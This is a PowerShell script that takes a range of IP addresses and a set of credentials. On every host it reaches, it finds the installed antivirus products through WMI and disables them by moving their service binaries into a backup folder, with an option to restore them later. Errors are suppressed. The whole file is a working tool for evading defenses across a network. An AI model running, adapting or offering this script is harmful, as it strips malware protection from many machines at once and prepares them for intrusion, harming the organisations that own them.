# Input for Target(s) & Credentials
$StartIP = Read-Host -Prompt 'Enter Start of IP Range..'
$EndIP = Read-Host -Prompt 'Enter End of IP Range.. (Same as Start if Single Host)'
$username = Read-Host -Prompt 'Enter Username'
$password = Read-Host -Prompt 'Enter Password' 
$password = ConvertTo-SecureString $password -AsPlainText -Force
$Chosenaction = Read-Host 'Disable (D) or Enable (E) AV?'

$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password

$ErrorActionPreference = "SilentlyContinue"

# Get IP Range (Function Borrowed From Dr. Tobias Weltner, MVP PowerShell)
    $ip1 = ([System.Net.IPAddress]$StartIP).GetAddressBytes()
    [Array]::Reverse($ip1)
    $ip1 = ([System.Net.IPAddress]($ip1 -join '.')).Address
    $ip2 = ([System.Net.IPAddress]$EndIP).GetAddressBytes()
    [Array]::Reverse($ip2)
    $ip2 = ([System.Net.IPAddress]($ip2 -join '.')).Address
    for ($x = $ip1; $x -le $ip2; $x++)
    {
        $ip = ([System.Net.IPAddress]$x).GetAddressBytes()
        [Array]::Reverse($ip)
        $Target = $ip -join '.'

$AVName = ""

# Query Host for Installed AV Products and Get Service Binary Location
$AVServices = Invoke-Command -ComputerName $Target -ScriptBlock {Get-WMIObject AntiVirusProduct -namespace root\securitycenter2} -credential $cred

# Start an Array for Multiple Results
#$arraylist = New-Object System.Collections.Arraylist

# Start Loop in Case of More than One AV Solution
foreach ($i in $AVServices){

$SvcPath = $i | foreach { $_.pathToSignedReportingExe }
$AVName = $i | foreach { $_.displayName }

$SvcDirectory = Split-Path -Path $SvcPath

if (-not ([string]::IsNullOrEmpty($AVName)))
{
Write-Host "Found $AVName on $Target.. Attempting Neutralization.."
}

# If Disabling AV, Create Backup Directory
If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0] | Out-Null} -credential $cred -ArgumentList $SvcDirectory"BACKUP"

# If Disabling AV, Move Service Files to "BACKUP" in Parent Directory
Write-Host "Moving AV Service Binaries from $SvcDirectory to $SvcDirectory"BACKUP" on $Target"

Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "\*") -Destination ($args[0] + "BACKUP\") -Force} -credential $cred -ArgumentList $SvcDirectory
}

# If Enabling AV, Move Service Files Back to Parent Directory From "BACKUP"
If ($Chosenaction -eq 'Enable' -Or $Chosenaction -eq 'E' -Or $Chosenaction -eq 'enable' -Or $Chosenaction -eq 'e'){
Write-Host "Moving AV Service Binaries back from $SvcDirectory"BACKUP" to $SvcDirectory on $Target"

Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "BACKUP\*") -Destination ($args[0] + "\") -Force} -credential $cred -ArgumentList $SvcDirectory

# If Enabling AV, Clean Up BACKUP Dir
Write-Host "Cleaning up Backup Dir on $Target"

Invoke-Command -ComputerName $Target -ScriptBlock {Remove-Item -Recurse -Force ($args[0] + "BACKUP")} -credential $cred -ArgumentList $SvcDirectory

}

}


    }
